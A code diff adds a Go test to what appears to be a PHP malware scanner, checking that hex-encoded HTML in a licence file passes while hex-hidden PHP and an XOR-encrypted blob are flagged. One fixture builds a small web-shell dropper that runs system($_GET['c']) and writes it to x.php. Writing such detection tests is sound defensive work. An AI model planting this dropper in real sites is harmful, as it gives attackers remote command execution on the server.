@@ -81,3 +81,38 @@ print_r($uniq([cfemail_decode($q)]));
 		t.Error("decoder writing a request-named file not flagged")
 	}
 }
+
+// A WHMCS License.php (2026-10-17): the licence holder's name is stored as
+// hex2bin('<a href=…>Name</a>'), next to base64_decode of the licence
+// signature. Hex that decodes to HTML is data; hex that decodes to code is not.
+func TestHexDataIsNotAPayload(t *testing.T) {
+	enc := func(s string) string {
+		const digits = "0123456789abcdef"
+		var b []byte
+		for i := 0; i < len(s); i++ {
+			b = append(b, digits[s[i]>>4], digits[s[i]&15])
+		}
+		return string(b)
+	}
+	link := enc("<a href='https://www.example.com/' class='text-danger font-weight-bold' style='text-decoration: none; font-weight: bold;'>Example Hosting</a>")
+	lic := "<?php\nnamespace WHMCS;\nclass License {\n  private function parse($d) { return json_decode(base64_decode(strrev($d)), true); }\n" +
+		"  protected function makeCall() { $r['registeredname'] = hex2bin('" + link + "'); return $r; }\n}\n"
+	if v := analyzePHP([]byte(lic)); v != nil {
+		t.Fatalf("licence file flagged %s", v.signature)
+	}
+	code := enc("<?php echo 'x'; system($_GET['c']); /* padding padding padding padding padding padding padding padding padding padding padding padding padding padding */ ?>")
+	hidden := "<?php\n$p = hex2bin('" + code + "');\nfile_put_contents(__DIR__ . '/x.php', $p);\n"
+	if v := analyzePHP([]byte(hidden)); v == nil {
+		t.Fatal("PHP code hidden as hex not flagged")
+	}
+	// Encrypted (XOR) bytes in hex are binary, not readable text: still flagged.
+	var x []byte
+	for i := 0; i < 200; i++ {
+		x = append(x, byte(i*37+11)^0x5a)
+	}
+	xored := "<?php\nfunction d($s, $k) { $r = ''; for ($i = 0; $i < strlen($s); $i++) $r .= chr(ord($s[$i]) ^ ord($k[$i % strlen($k)])); return $r; }\n" +
+		"$cfg = json_decode(d(hex2bin('" + enc(string(x)) + "'), 'K3y'), true);\n"
+	if v := analyzePHP([]byte(xored)); v == nil {
+		t.Fatal("XOR-encrypted hex blob not flagged")
+	}
+}
